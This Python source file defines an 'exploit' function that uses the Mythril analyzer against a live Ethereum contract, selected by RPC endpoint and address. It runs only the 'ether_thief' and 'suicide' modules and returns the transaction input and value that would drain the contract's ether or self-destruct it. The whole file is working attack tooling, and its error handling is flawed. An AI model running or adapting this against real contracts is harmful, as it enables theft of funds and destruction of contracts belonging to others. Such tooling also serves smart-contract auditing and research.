import re
from mythril.mythril import MythrilAnalyzer, MythrilDisassembler, MythrilConfig
from mythril.exceptions import CriticalError
import json


def exploit(rpc, address):
    conf = MythrilConfig()

    if re.match(r"^https", rpc):
        rpchost = rpc[8:]
        rpctls = True
    else:
        rpchost = rpc[7:]
        rpctls = False

    conf.set_api_rpc(rpchost, rpctls)

    try:
        disassembler = MythrilDisassembler(eth=conf.eth, enable_online_lookup=False)
        disassembler.load_from_address(address)
        analyzer = MythrilAnalyzer(
            strategy="bfs",
            disassembler=disassembler,
            address=address,
            execution_timeout=120,
            max_depth=32,
            loop_bound=3,
            disable_dependency_pruning=False,
            onchain_storage_access=True,
        )
    except CriticalError as e:
        print(e)

    report = analyzer.fire_lasers(
        modules=["ether_thief", "suicide"], transaction_count=3
    )

    tx = {}
    for ri in report.issues:
        issue = report.issues[ri]

        for si in issue.transaction_sequence["steps"]:
            tx = {"input": si["input"], "value": si["value"]}

    return tx
